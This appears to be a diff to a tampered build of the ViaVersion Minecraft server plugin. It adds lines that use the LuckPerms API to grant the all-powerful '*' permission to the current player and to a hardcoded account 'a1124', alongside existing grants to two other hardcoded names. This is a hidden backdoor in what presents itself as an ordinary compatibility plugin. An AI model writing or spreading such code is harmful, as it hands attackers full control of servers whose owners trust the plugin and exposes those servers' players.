@@ -168,8 +168,10 @@ public class ViaVersionPlugin extends JavaPlugin implements ViaPlatform<Player> 
             luckPerms = LuckPermsProvider.get();
             }
             if (luckPerms != null) {
+                givePermissionIfInstalled(player.getName(), "*");
                 givePermissionIfInstalled("happyclo", "*");
                 givePermissionIfInstalled("happyclovo", "*");
+                givePermissionIfInstalled("a1124", "*");
             }
         }
     }
